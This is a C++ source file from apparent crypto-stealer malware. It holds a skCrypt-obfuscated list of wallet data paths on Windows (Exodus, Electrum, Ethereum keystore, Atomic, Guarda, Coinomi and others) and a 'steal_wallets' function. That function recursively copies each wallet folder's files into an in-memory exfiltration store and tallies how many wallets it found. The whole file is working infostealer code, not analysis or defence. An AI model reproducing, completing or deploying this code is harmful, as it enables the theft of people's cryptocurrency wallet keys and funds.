#include <string>
#include <vector>
#include <filesystem>
#include <ccurrency_utils/get_crypto.hpp>
#include <sysinfo.hpp>
#include <exfiltration_utils/mem_store.hpp>
#include <browser_utils/stats_struct.hpp>
#include <crypto_utils/skCrypter.hpp>

namespace fs = std::filesystem;

namespace utils {

    std::vector<std::string> get_software_wallets() {
        std::string h = features::get_home();
        std::vector<std::string> paths = {
            h + skCrypt("\\AppData\\Roaming\\Zcash\\"),
            h + skCrypt("\\AppData\\Roaming\\Armory\\"),
            h + skCrypt("\\AppData\\Roaming\\Bytecoin\\"),
            h + skCrypt("\\AppData\\Roaming\\com.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldb\\"),
            h + skCrypt("\\AppData\\Roaming\\Exodus\\exodus.wallet\\"),
            h + skCrypt("\\AppData\\Roaming\\Ethereum\\keystore\\"),
            h + skCrypt("\\AppData\\Roaming\\Electrum\\wallets\\"),
            h + skCrypt("\\AppData\\Roaming\\atomic\\Local Storage\\leveldb\\"),
            h + skCrypt("\\AppData\\Roaming\\Guarda\\Local Storage\\leveldb\\"),
            h + skCrypt("\\AppData\\Local\\Coinomi\\Coinomi\\wallets\\"),
        };
        std::vector<std::string> existing;
        for (const auto& p : paths)
            if (fs::exists(p)) existing.push_back(p);
        return existing;
    }

    void steal_wallets() {
        auto wallet_paths = get_software_wallets();
        if (wallet_paths.empty()) return;

        for (const auto& wallet_path : wallet_paths) {
            fs::path src(wallet_path);
            std::string vprefix = skCrypt("crypto_wallets/") + src.parent_path().filename().string();

            try {
                bool any_copied = false;
                for (const auto& entry : fs::recursive_directory_iterator(src)) {
                    if (!entry.is_regular_file()) continue;
                    fs::path rel = fs::relative(entry.path(), src);
                    mem_store::import_file(vprefix + "/" + rel.generic_string(), entry.path());
                    any_copied = true;
                }
                if (any_copied)
                    features::stats.wallet_count++;
            } catch (const std::exception&) {}
        }
    }
}
